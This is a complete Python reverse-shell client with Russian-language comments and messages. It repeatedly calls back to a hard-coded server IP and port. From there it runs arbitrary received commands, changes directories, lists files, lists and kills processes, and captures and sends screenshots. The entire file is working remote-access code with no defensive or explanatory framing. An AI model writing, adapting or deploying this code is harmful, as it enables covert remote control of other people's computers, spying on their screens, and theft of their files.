import socket
import subprocess
import os
import sys
import time

SERVER_IP = "192.168.100.3"  # ваш IP сервера
SERVER_PORT = 5000
BUFFER_SIZE = 4096

def execute_command(command):
    try:
        output = subprocess.getoutput(command)
        return output
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"

def is_windows():
    return os.name == 'nt'

def main():
    current_dir = os.getcwd()

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
        except Exception:
            time.sleep(5)
            continue

        try:
            while True:
                data = s.recv(BUFFER_SIZE).decode(errors='ignore')
                if not data:
                    break
                if data == "exit":
                    break

                if data.startswith("cmd:"):
                    cmd = data[4:]

                    if cmd.startswith("cd"):
                        path = cmd[2:].strip()
                        if not path:
                            path = os.path.expanduser("~")
                        try:
                            os.chdir(path)
                            current_dir = os.getcwd()
                            s.send(f"Сменена директория на {current_dir}".encode(errors='ignore'))
                        except Exception as e:
                            s.send(f"Ошибка смены директории: {e}".encode(errors='ignore'))

                    elif cmd.startswith("ls"):
                        # Новая обработка: ls список файлов
                        path = cmd[2:].strip()
                        if not path or path == "~":
                            path = os.path.expanduser("~")
                        try:
                            entries = os.listdir(path)
                            dirs = []
                            files = []
                            for e in entries:
                                full_path = os.path.join(path, e)
                                if os.path.isdir(full_path):
                                    dirs.append(e + '/')
                                else:
                                    files.append(e)
                            result = "\n".join(sorted(dirs) + sorted(files))
                            s.send(result.encode(errors='ignore'))
                        except Exception as e:
                            s.send(f"Ошибка получения списка: {e}".encode(errors='ignore'))

                    else:
                        output = execute_command(cmd)
                        s.send(output.encode(errors='ignore'))

                elif data == "process_list":
                    if is_windows():
                        procs = subprocess.getoutput('tasklist')
                    else:
                        procs = subprocess.getoutput('ps aux')
                    s.send(procs.encode(errors='ignore'))

                elif data.startswith("kill:"):
                    pid = data[5:]
                    try:
                        if is_windows():
                            subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                        else:
                            subprocess.check_output(f'kill -9 {pid}', shell=True)
                        s.send(f"Процесс {pid} завершён.".encode(errors='ignore'))
                    except Exception as e:
                        s.send(f"Ошибка: {e}".encode(errors='ignore'))

                elif data == "screenshot":
                    try:
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screen.jpg")
                        with open("screen.jpg", "rb") as f_img:
                            while True:
                                chunk = f_img.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                        os.remove("screen.jpg")
                    except Exception as e:
                        s.send(f"Ошибка снятия скриншота: {e}".encode(errors='ignore'))

                else:
                    s.send("Неизвестная команда".encode(errors='ignore'))

        except:
            pass
        finally:
            s.close()

        time.sleep(5)

if __name__ == "__main__":
    main()
